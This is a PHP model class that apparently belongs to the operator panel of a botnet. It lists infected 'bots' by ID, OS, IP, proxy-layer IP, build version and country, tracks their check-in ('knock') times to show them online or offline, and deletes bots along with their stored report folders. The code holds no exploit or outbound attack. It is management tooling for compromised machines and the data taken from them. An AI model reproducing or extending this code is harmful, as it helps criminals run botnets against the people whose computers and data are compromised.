<?php

require_once 'application/models/accessory_models/PaginationWorker.php';

class Model_Bots extends Model
{

    public function get_data()
    {

    }

    public function getBots()
    {
        $bots_array = $this->getDB()->queryRows('SELECT * FROM bots ORDER BY id DESC');
        if (!empty($bots_array))
            return $bots_array;
        else
            return NULL;
    }

    public function updateComment()
    {
        if(!empty($this->request_data['id'])){
            $this->getDB()->update('bots', array('comment' => $this->request_data['comment']), 'id=:id', array(':id' => $this->request_data['id']));
            return true;
        } else {
            return false;
        }
    }

    public function deleteBot()
    {
        if(!empty($this->request_data['id'])) {
            $botid = $this->getDB()->getValue('bots', 'botid', 'id=:id', array(':id' => $this->request_data['id']));
            $this->getDB()->delete('bots', 'id=:id', array(':id' => $this->request_data['id']));
            recursiveDelete(REPORTS_DIRECTORY . $botid);
            return true;
        }
        return false;
    }


    /**
     * NEW FUNCTIONAL WITH SORTING
     */

    public function getBotsData()
    {
        if (empty($this->request_data['pageSize']) || empty($this->request_data['pageNumber']))
        {
            return NULL;
        }

        $paginationWorker = new PaginationWorker($this->request_data['pageSize'], $this->request_data['pageNumber']);

        $generalFilter = base64_decode($this->request_data['filter']);

        $filters = json_decode(base64_decode($this->request_data['additional_filters']), true);

        $knock_time = $this->getSettings()['knock'] * 60;

        if (!empty($generalFilter))
        {
            $paginationWorker->setFilter(
                ' WHERE (botid LIKE :filter OR 
                    os LIKE :filter OR 
                    domain_name LIKE :filter OR 
                    ip LIKE :filter OR 
                    build_version LIKE :filter OR 
                    layer_ip LIKE :filter OR 
                    country LIKE :filter)
                ', array(':filter' => $generalFilter));
        }
        else
        {
            $onlineInd = $this->findValueByKey($filters, 'online');
            if ($filters[$onlineInd]['value'])
            {
                unset($filters[$onlineInd]);
                $paginationWorker->setAdditionalFilter($filters, true);
                $paginationWorker->addCustomFilter(' (last_login + '. $knock_time .' > '. time() .')');
            }
            else
            {
                unset($filters[$onlineInd]);
                $paginationWorker->setAdditionalFilter($filters, true);
            }
        }

        $grabberData = $this->getDB()->queryRows(
            'SELECT
                      bots.id,botid,os,cpu,ip,build_version,country,first_login,last_login,comment,layer_ip,reports_netview_info.domain_name AS domain_name
                    FROM
                      bots LEFT JOIN reports_netview_info ON reports_netview_info.bot_id = bots.id'.$paginationWorker->getFilterText(). $paginationWorker->getOrderBy('bots.id', true) . $paginationWorker->getLimit(),
            $paginationWorker->getFilterValues());

        $totalCount = $this->getDB()->queryValue(
            'SELECT
                      COUNT(bots.id)
                    FROM
                      bots LEFT JOIN reports_netview_info ON reports_netview_info.bot_id = bots.id
                      '.$paginationWorker->getFilterText() . $paginationWorker->getOrderBy('bots.id', true),
            $paginationWorker->getFilterValues());

        $responseData = $paginationWorker->getJsonEncodedData($totalCount, $grabberData, static function($dataRow, $data) {

            $status = ($dataRow['last_login'] + ($data['knock_time']) < time()) ? '<strong class="label label-danger">Offline</strong>' : '<strong class="label label-success">Online</strong>';
            $days = ($dataRow['first_login'] - time())*(-1);
            switch ($days)
            {
                case $days>60*60*23.5:
                    $days = round($days/(60*60*24)).' day(s)';
                    break;
                case $days>60*60:
                    $days = round($days/(60*60)).' hour(s)';
                    break;
                default:
                    $days = round($days/(60)).' min(s)';
            }
            $days .= ' ago';

            $domainName = $dataRow['domain_name'] != null ? htmlspecialchars($dataRow['domain_name']) : '-';
            $layerIp = $dataRow['layer_ip'] != null ? htmlspecialchars($dataRow['layer_ip']) : '-';

            $retVal = '
                <tr id="row_'.$dataRow['id'].'">
                    <td><a href="/bot?bot_id='.$dataRow['id'].'">'.htmlspecialchars($dataRow['botid']).'</a></td>
                    <td>'.((!empty($dataRow['os'])) ? htmlspecialchars($dataRow['os']) : 'Unknown').'</td>
                    <td>'.$domainName.'</td>
                    <td>'.$days.'</td>
                    <td>'.htmlspecialchars($dataRow['ip']).'</td>
                    <td>'.$layerIp.'</td>
                    <td>'.htmlspecialchars($dataRow['build_version']).'</td>
                    <td>'.'<img class="flag flag-'.strtolower(htmlspecialchars($dataRow['country'])).'"> '.htmlspecialchars($dataRow['country']).'</td>
                    <td>'.$status.'</td>
                    <td><center><i style="cursor: pointer;" onclick="deleteBot('.$dataRow['id'].')" class="fa fa-trash-o fa-lg text-danger"></i></center></td>
                    <td><input id="comment_'.$dataRow['id'].'" class="our-comment form-control" type="text" value="'.htmlspecialchars($dataRow['comment']).'" style="width=100%;"></td>
                </tr>
            ';
            unset($status);
            unset($days);

            return $retVal;
        }, array('knock_time' => $knock_time));

        return $responseData;
    }

    private function findValueByKey($filters, $key)
    {
        foreach($filters as $index => $filter)
        {
            if ($filter['name'] === $key)
            {
                return $index;
            }
        }
        return null;
    }


}